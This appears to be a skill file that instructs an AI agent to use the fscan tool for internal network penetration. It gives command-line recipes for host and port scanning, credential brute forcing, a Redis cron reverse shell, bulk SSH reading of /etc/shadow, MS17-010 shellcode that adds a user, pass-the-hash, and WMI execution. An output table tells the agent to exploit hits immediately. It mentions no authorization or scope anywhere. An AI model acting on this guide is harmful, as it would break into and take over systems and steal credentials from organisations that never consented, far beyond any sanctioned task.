---
name: fscan-scan
description: "Use fscan for comprehensive internal network scanning and exploitation. Once you have an internal foothold and need live host detection, port scanning, weak credential brute forcing, or vulnerability detection, fscan is the first choice — a single dependency-free binary that completes the live host + port + service + weak credential + POC workflow in one command. It also supports post-exploitation operations such as writing public keys / scheduled tasks to Redis, SSH command execution, MS17-010 exploitation, pass-the-hash, and WMI remote execution. Use this skill for any internal network scanning, subnet probing, bulk weak credential detection, internal vulnerability scanning, domain controller identification, or NetBIOS probing scenario. Even if you just want a quick look at what is live in a subnet, prefer fscan over nmap"
zh-signals: "使用 fscan 进行内网综合扫描与利用，单条命令完成存活探测、端口扫描、弱口令爆破、POC 检测及 Redis/SSH/MS17-010 等后利用操作。信号:内网扫描,端口扫描,弱口令,fscan,POC,横向移动"
when-to-use: >-
  Use after gaining an internal foothold when you need fast host liveness checks, port and
  service scanning, weak-credential brute forcing, POC detection, or post-exploitation
  actions such as Redis key writing and pass-the-hash.
metadata:
  tags: "fscan,internal-network-scan,port-scan,weak-credentials,poc,liveness-probe,lateral,port,scan,bruteforce,subnet,intranet-penetration,redis,ms17010,netbios,domain-controller"
  category: "tool"
---

# fscan Comprehensive Internal Network Scan

fscan integrates the most common actions in internal network penetration — live host detection, port scanning, service identification, weak credential brute forcing, vulnerability POCs, and even some exploitation — into a single dependency-free Go binary. Upload it to an internal machine and it runs as is; no nmap install, no Python install.

> **Important**: in post-exploitation scenarios fscan should be uploaded to the target machine and executed there rather than run locally through a proxy tunnel — SOCKS5 does not support ICMP, so liveness detection fails; pushing heavy scan traffic through a tunnel is slow and unstable. For how to deliver tools to the target → load the `tool-delivery` skill.

Project URL: https://github.com/shadow1ng/fscan

## Why fscan Is Preferred for Internal Scanning

| Dimension | fscan | nmap |
|------|-------|------|
| Deployment | Single binary, scp it up and use it | Requires installation, usually unavailable on internal machines |
| Speed | 600 concurrent threads by default, a /24 completes in seconds | Single-threaded by default, slow |
| Weak credentials | Built-in SSH/SMB/RDP/MySQL/MSSQL/Redis/PostgreSQL/Oracle/FTP/MongoDB brute forcing | Not supported |
| POC | Built-in MS17-010/Redis unauthorized/WebLogic/Struts2 etc., compatible with xray POCs | Requires NSE scripts |
| Exploitation | Redis public key write, SSH command execution, MS17-010 shellcode | Not supported |
| Domain controller identification | NetBIOS probing + DC flagging | Requires extra scripts |
| Web fingerprinting | Automatically identifies CMS/OA frameworks (Seeyon, Weaver, Tongda, etc.) | Not supported |

nmap's advantages are precise service version identification (`-sV`) and the NSE script ecosystem. Recommended workflow: **fscan for a fast full-subnet scan → nmap for deep probing of high-value targets**.

## Phase 1: Basic Scanning

```bash
# Most common: full-feature scan (live host + ports + weak credentials + POC together)
fscan -h 10.0.0.0/24

# Fast mode (live host + ports only, skip web POCs)
fscan -h 10.0.0.0/24 -nopoc

# Quiet scan (reduce output noise)
fscan -h 10.0.0.0/24 -nopoc -nobr

# Read targets from a file
fscan -hf targets.txt

# Exclude specific hosts
fscan -h 10.0.0.0/24 -hn 10.0.0.1,10.0.0.254
```

`-nopoc` skips web vulnerability POCs, `-nobr` skips weak credential brute forcing — they are controlled independently. Skipping both leaves only live host + port scanning, which is the fastest but yields the least information.

## Phase 2: Port and Module Control

```bash
# Specify a port
fscan -h 10.0.0.0/24 -p 22,80,445,3389,6379

# Append ports to the default port list (does not override the defaults)
fscan -h 10.0.0.0/24 -pa 3389,5985

# Exclude certain ports
fscan -h 10.0.0.0/24 -pn 445

# All ports
fscan -h 10.0.0.0/24 -p 1-65535

# Run only one module (no full scan)
fscan -h 10.0.0.0/24 -m ssh          # SSH brute force only
fscan -h 10.0.0.0/24 -m ms17010      # EternalBlue detection only
fscan -h 10.0.0.0/24 -m netbios      # NetBIOS probing only (domain controller identification)
fscan -h 10.0.0.0/24 -m icmp         # Liveness detection only (for large subnets)
fscan -h 10.0.0.0/24 -m webonly      # Skip port scanning, probe web directly
```

Default port list: `21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017`

The value of `-m` lies in precise control — when a full scan is too slow, specify a module and do only what you care about.

## Phase 3: Weak Credential Brute Forcing

This is fscan's biggest differentiator against nmap. The default scan already includes weak credential detection (built-in wordlist), but you can customize it:

```bash
# Custom usernames and passwords (comma-separated)
fscan -h 10.0.0.0/24 -user admin,root,sa -pwd 'admin,123456,P@ssw0rd'

# Append to the default wordlist (does not override the built-in one)
fscan -h 10.0.0.0/24 -usera DBA -pwda 'Str0ngPwd!'

# Load from files
fscan -h 10.0.0.0/24 -userf /tmp/users.txt -pwdf /tmp/passwords.txt

# Brute force threads (default 1, increasing it speeds things up but makes detection easier)
fscan -h 10.0.0.0/24 -br 5

# Domain user brute forcing (SMB)
fscan -h 10.0.0.0/24 -m smb -domain CORP
```

Supported brute force protocols:

| Protocol | Default Port | Description |
|------|----------|------|
| SSH | 22 | Linux remote access |
| SMB | 445 | Windows file sharing, pass-the-hash |
| RDP | 3389 | Windows remote desktop |
| MySQL | 3306 | Database |
| MSSQL | 1433 | Database (weak sa credentials are frequent) |
| PostgreSQL | 5432 | Database |
| Oracle | 1521 | Database |
| Redis | 6379 | No authentication = direct exploitation |
| FTP | 21 | File transfer |
| MongoDB | 27017 | No authentication = data leak |
| Memcached | 11211 | No authentication |

## Phase 4: Vulnerability POCs and Web Fingerprinting

```bash
# The default scan includes POCs (MS17-010, Redis unauthorized, WebLogic, Struts2, etc.)
fscan -h 10.0.0.0/24

# Run only POCs with a specific name
fscan -h 10.0.0.0/24 -pocname weblogic
fscan -h 10.0.0.0/24 -pocname shiro

# Full POC scan (e.g. shiro detection tries 100 keys instead of the default 10)
fscan -h 10.0.0.0/24 -full

# Load external xray-format POCs
fscan -h 10.0.0.0/24 -pocpath /tmp/my_pocs/

# Forward POC traffic through an HTTP proxy (pair with Burp auditing)
fscan -h 10.0.0.0/24 -proxy http://127.0.0.1:8080
```

Web fingerprinting is automatic — fscan identifies common CMS (WordPress/Drupal) and domestic OA systems (Seeyon/Weaver/Tongda/Yonyou) and flags them in the output.

## Phase 5: Post-Exploitation Features

fscan is not just a scanner, it can also perform exploitation directly. This is very useful in internal network penetration — exploit weaknesses immediately after finding them without switching tools:

```bash
# Redis write SSH public key (unauthenticated Redis → SSH login)
fscan -h 10.0.0.30 -rf ~/.ssh/id_rsa.pub

# Redis scheduled task reverse shell
fscan -h 10.0.0.30 -rs 10.0.0.5:4444

# Bulk SSH command execution (use directly after finding weak credentials)
fscan -h 10.0.0.0/24 -c "cat /etc/shadow"

# SSH connection with a private key
fscan -h 10.0.0.10 -m ssh -sshkey /tmp/id_rsa

# MS17-010 exploitation (built-in shellcode, e.g. adding a user)
fscan -h 10.0.0.10 -m ms17010 -sc add

# SMB hash pass (pass-the-hash)
fscan -h 10.0.0.0/24 -m smb2 -user administrator -hash aad3b435b51404eeaad3b435b51404ee:xxxxx

# WMI command execution without output
fscan -h 10.0.0.10 -m wmiexec -user admin -pwd password -c "whoami"
```

## Phase 6: Network and Performance Tuning

```bash
# No ICMP liveness detection (use when the firewall blocks ping)
fscan -h 10.0.0.0/24 -np

# Use ping instead of ICMP packets (raw sockets are restricted in some environments)
fscan -h 10.0.0.0/24 -ping

# Adjust concurrent threads (default 600, can be raised for large subnets)
fscan -h 10.0.0.0/16 -t 2000

# Adjust the timeout (default 3 seconds, raise it on poor networks)
fscan -h 10.0.0.0/24 -time 5

# Web timeout (default 5 seconds)
fscan -h 10.0.0.0/24 -wt 10

# SOCKS5 proxy (multi-layer networks, scan the inner layer through the proxy)
fscan -h 172.16.0.0/24 -socks5 127.0.0.1:1080

# Write output to a file (default result.txt)
fscan -h 10.0.0.0/24 -o /tmp/fscan_result.txt

# Do not save the file
fscan -h 10.0.0.0/24 -no

# Quick reconnaissance of a large subnet (when scanning a /8 it samples each C-segment gateway + random IPs automatically)
fscan -h 192.0.0.0/8 -m icmp
```

## Output Interpretation

fscan classifies the output automatically; pay attention to these key markers:

| Marker | Meaning | Action |
|------|------|------|
| `[+] MS17-010` | EternalBlue | 🔴 Exploit immediately with msf or fscan `-sc add` |
| `[+] DC` | Domain controller | 🔴 Highest-value target, record the IP |
| `[+] Redis unauthorized` | Redis without authentication | 🔴 `fscan -rf` to write a public key or `-rs` for a reverse shell |
| `[+] weak password` | Weak credential hit | 🔴 Log in immediately |
| `[+] unauthorized` | Any unauthenticated service | 🔴 Exploit immediately |
| `[+] poc` / `[+] vuln` | Vulnerability hit | 🟡 Verify, then exploit |
| `[*] WebTitle` | Web title + fingerprint | 🟢 Identify the CMS/OA type |
| `[*] NetBios` | NetBIOS information | 🟢 Hostname, domain, OS version |
| `open` | Port open | 🟢 Record it for later analysis |

## Practical Scenario Quick Reference

### Gaining an internal foothold and quickly mapping the network
```bash
ip addr | grep inet          # confirm the current subnet
fscan -h 10.0.1.0/24 -o /tmp/result.txt  # one-shot sweep
cat /tmp/result.txt          # review all findings
```

### Targeted weak credential testing (using already collected credentials)
```bash
fscan -h 10.0.0.0/24 -p 22,3389,445 \
  -user admin,administrator,root -pwd 'P@ssw0rd,Admin@123'
```

### Domain controller identification
```bash
fscan -h 10.0.0.0/24 -m netbios    # the [+]DC marker means domain controller
```

### Cross-subnet scanning
```bash
fscan -h 172.16.0.0/24 -socks5 127.0.0.1:1080
```
